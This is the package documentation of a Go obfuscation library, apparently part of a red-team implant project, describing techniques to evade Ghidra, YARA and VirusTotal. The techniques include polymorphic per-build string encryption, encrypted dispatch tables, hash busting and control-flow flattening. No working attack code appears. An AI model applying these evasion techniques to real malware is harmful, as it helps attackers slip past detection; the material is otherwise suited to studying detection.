// Package obfuscate provides build-hardening primitives to resist
// static analysis by Ghidra, YARA engines (VirusTotal), and bytecode/pclntab
// analysis.
//
// Threat surface addressed:
//
//  1. Ghidra Go-binary recovery — garble + BuildID scrub + pclntab minimization.
//  2. Well-known Go/stdlib function patterns — indirect dispatch table so that
//     CALL X25519, CALL chacha20poly1305.New, CALL hkdf.Key do not appear as
//     direct edges in the call graph. A per-build seeded shuffle means the
//     table layout is polymorphic per artifact.  Dispatch table entries are
//     XOR-encrypted at rest and decrypted lazily on first access, defeating
//     memory-scan recovery of plaintext function pointers.
//  3. VirusTotal/YARA string matching — all sensitive literals are XOR-rotated
//     with a per-build seed (overriding via -ldflags -X) using a hardened
//     schedule with secondary key derivation and data-dependent ciphertext
//     feedback; decoded on-stack with volatile zeroing + compiler barrier;
//     VT hash busting via polymorphic overlay padding.
//  4. Linear-sweep/disassembly and bytecode analysis — opaque predicates,
//     control-flow flattening, and junk islands (opaque-predicate NOP islands
//     in junk_island.go) with data-dependent iteration counts that pollute
//     Ghidra's decompiler and generic bytecode VMs. A genuine overlapping-
//     instruction (JMP-over-data) trick would require hand-written arch-
//     specific asm and is intentionally NOT used here: a mis-encoded trampoline
//     would crash the agent at runtime, and its mis-decode behavior cannot be
//     verified in this build environment.
//  5. Dispatch table memory scanning — function pointers stored in the dispatch
//     table are XOR-encrypted with a per-build key; decryption is deferred to
//     first access via lazy caching, so .data/.bss does not contain plaintext
//     function addresses at rest.
//  6. Compiler dead-store elimination — SecureZero issues runtime.KeepAlive +
//     runtime.Gosched barriers after volatile zeroing to prevent the Go
//     compiler from eliding security-critical memory wipes.
//
// Lab safety: this package performs no network, file, or privilege operations.
// The obfuscation is reversible only at runtime; source remains auditable.
//
// Usage:
//
//	import "github.com/ashwnn/adverse-go/internal/obfuscate"
//
//	plain := obfuscate.Get(obfuscate.StrNtdllDLL)     // generated string table
//	aead, err := obfuscate.NewAEADIndirect(key)       // masked chacha
//	if obfuscate.OpaqueAlwaysTrue(seed) { ... }      // anti-analysis branch
//	state := obfuscate.FlattenedDispatcher(3, seed)  // CF flattening
package obfuscate
